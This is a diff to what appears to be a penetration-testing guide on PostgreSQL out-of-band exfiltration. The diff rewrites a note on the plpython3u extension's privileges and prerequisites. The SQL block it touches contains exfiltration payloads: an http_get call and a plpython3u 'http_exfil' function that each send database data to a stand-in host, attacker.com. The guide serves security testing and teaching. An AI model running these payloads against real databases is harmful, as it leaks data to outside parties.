@@ -275,20 +275,20 @@ LISTEN channel;
 
 ### HTTP Extensions
 
-Some PostgreSQL installations have HTTP extensions:
+Some PostgreSQL installations have HTTP extensions for outbound requests.
+
+**Note:** The `plpython3u` extension is rarely present in production environments due to the security risk of allowing arbitrary Python code execution. Untrusted PL languages ("u" suffix) require superuser privileges to install (`CREATE EXTENSION plpython3u`) and to create functions. The extension must also be installed at the OS level (`apt install postgresql-plpython3-XX`). This technique is primarily useful against misconfigured development/test systems.
 
 ```sql
 -- If http extension is installed
 SELECT http_get('http://attacker.com/?data=' || (SELECT version()));
 
--- Using plpython3u if available (requires: CREATE EXTENSION plpython3u)
+-- Using plpython3u if available
 CREATE FUNCTION http_exfil(data text) RETURNS void AS $$
 import urllib.request
 urllib.request.urlopen('http://attacker.com/?d=' + data)
 $$ LANGUAGE plpython3u;
 ```
-
-**Note:** The `plpython3u` extension must be installed on the server (`apt install postgresql-plpython3-XX` or equivalent) and enabled (`CREATE EXTENSION plpython3u`) before creating PL/Python functions. The "u" suffix indicates untrusted language, requiring superuser privileges.
 
 ### Required Setup
 
